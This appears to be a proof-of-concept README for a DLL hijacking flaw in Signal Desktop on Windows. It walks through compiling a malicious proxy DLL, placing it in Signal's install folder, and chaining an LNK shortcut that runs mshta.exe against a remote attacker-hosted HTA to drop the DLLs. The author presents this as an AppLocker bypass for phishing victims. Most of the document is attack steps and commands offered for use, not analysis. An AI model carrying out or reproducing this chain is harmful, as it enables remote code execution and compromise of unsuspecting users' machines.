# CVE-2023-XXXXX
## CVE Description

# Steps to Replicate
1. First, create a malicious DLL. Signal references a bunch of non-existent DLLs, so for this example, I used `cryptbase.dll`. You can use [this repository](https://github.com/tothi/dll-hijack-by-proxying) to build the DLL, but I'll simplify the steps for you:
   * Clone the repo.
   * Modify the `payload.c` file as you see fit.
   * Copy `C:\Windows\System32\cryptbase.dll` into the `dll-hijack-by-proxying` directory as `cryptbase_original.dll`.
   * Create the exports using the `gen_def.py` script in the `dll-hijack-by-proxying` directory.

    ```
    python3 gen_def.py cryptbase_orig.dll > cryptbase.def
    ```
   
   * Run the following command if you're compiling for x64 Windows:

    ```
    compilex86_64-w64-mingw32-gcc -shared -o cryptbase.dll cryptbase.c cryptbase.def -s
    ```

2. Now you've got your malicious DLL. Copy `cryptbase.dll` and `cryptbase_orig.dll` into the `%LocalAppData\Programs\signal-desktop` folder.
3. Run Signal, and the code will execute. Here's a cute calculator PoC example:
   
    ![Calculator PoC](https://raw.githubusercontent.com/johnjhacking/placeholder/main/1.png?token=GHSAT0AAAAAABZSW66OBKS446AIMVFSEHF6ZASOIUQ)

# Turning up the Heat
If you're like me, simply popping the calculator isn't enough. Let's chain this as an LNK -> HTA -> Your Payload. Signal references non-existent DLL files, and you can chain this against as a bypass against something like AppLocker or a default deny tool, leveraging the trust of the product as a "safe" messenger.

1. Create an LNK shortcut, and change the target to the following:

    ```
    C:\Windows\System32\mshta.exe https://yourdomain/poc.hta
    ```

    It should look something like this:
   
    ![LNK PoC](https://raw.githubusercontent.com/johnjhacking/placeholder/main/2.png?token=GHSAT0AAAAAABZSW66P7OWYJP4BVQXBRA5GZASOJGQ)

2. Host your `cryptbase.dll` and `cryptbase_orig.dll` files.
3. Modify the code in the `poc.hta` file within this GitHub repo to utilize the URLs of your hosted DLL files.
4. Host the HTA on your domain.
5. Run the LNK shortcut and watch as the DLL files are dropped into the `%LocalAppData\Programs\signal-desktop` folder.
6. Now, when the victim runs Signal, your malicious DLL will run. Phishing ftw.
7. You can use whatever you want, but for a quick test, I hosted an HTA server to see if my HTA would drop the DLLs that execute an HTA LOL, so in my case, the chain was LNK -> HTA drops DLLs -> User runs Signal -> DLL executes remote HTA. In a non-poc scenario, I'd swap the HTA payload out with a custom DLL payload and cut out the secondary remote call.
   
    ![RCE Proof](https://raw.githubusercontent.com/johnjhacking/placeholder/main/3.png?token=GHSAT0AAAAAABZSW66OWR6EFTYZEPV3LOHCZASOJSQ)
